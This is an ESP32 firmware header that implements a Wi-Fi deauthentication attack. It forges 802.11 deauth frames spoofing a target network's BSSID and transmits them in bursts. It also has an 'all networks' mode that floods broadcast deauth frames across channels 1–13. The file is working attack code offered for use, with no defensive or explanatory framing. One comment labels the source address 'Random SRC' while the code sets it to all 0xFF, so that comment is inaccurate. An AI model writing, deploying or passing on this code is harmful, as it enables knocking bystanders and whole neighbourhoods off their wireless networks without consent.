// deauther.h
#ifndef DEAUTHER_H
#define DEAUTHER_H

#include <esp_wifi.h>

extern int networkCount;
extern struct NetworkInfo networks[];
extern int currentTarget;

bool deauthActive = false;
int deauthTarget = -1;
bool deauthAllMode = false;

uint8_t deauthPacket[26] = {
  0xC0, 0x00,  // Frame control: deauth
  0x00, 0x00,  // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SRC MAC (filled later)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (filled later)
  0x00, 0x00   // Sequence
};

void startDeauthAttack(int idx) {
  deauthTarget = idx;
  deauthAllMode = false;
  deauthActive = true;
  
  // Set channel
  esp_wifi_set_channel(networks[idx].channel, WIFI_SECOND_CHAN_NONE);
  
  // Copy BSSID
  uint8_t bssid[6];
  sscanf(networks[idx].bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
    &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
  
  memcpy(&deauthPacket[10], bssid, 6);  // SRC = BSSID
  memcpy(&deauthPacket[16], bssid, 6);  // BSSID = BSSID
  
  Serial.printf("Deauth attack started on %s (CH:%d)\n", 
    networks[idx].ssid.c_str(), networks[idx].channel);
}

void startDeauthAll() {
  deauthActive = true;
  deauthAllMode = true;
  Serial.println("Deauth all networks mode enabled");
}

void stopDeauthAttack() {
  deauthActive = false;
  deauthAllMode = false;
  deauthTarget = -1;
}

void runDeauth() {
  if (!deauthActive) return;
  
  if (deauthAllMode) {
    // Send broadcast deauth on all channels
    for (int ch = 1; ch <= 13; ch++) {
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      deauthPacket[10] = 0xFF; deauthPacket[11] = 0xFF; // Random SRC
      deauthPacket[12] = 0xFF; deauthPacket[13] = 0xFF;
      deauthPacket[14] = 0xFF; deauthPacket[15] = 0xFF;
      memcpy(&deauthPacket[16], &deauthPacket[10], 6); // Same BSSID
      for (int i = 0; i < 5; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
      }
    }
  } else if (deauthTarget >= 0 && deauthTarget < networkCount) {
    // Send 10 deauth packets
    for (int i = 0; i < 10; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    }
  }
  delay(100);
}

#endif
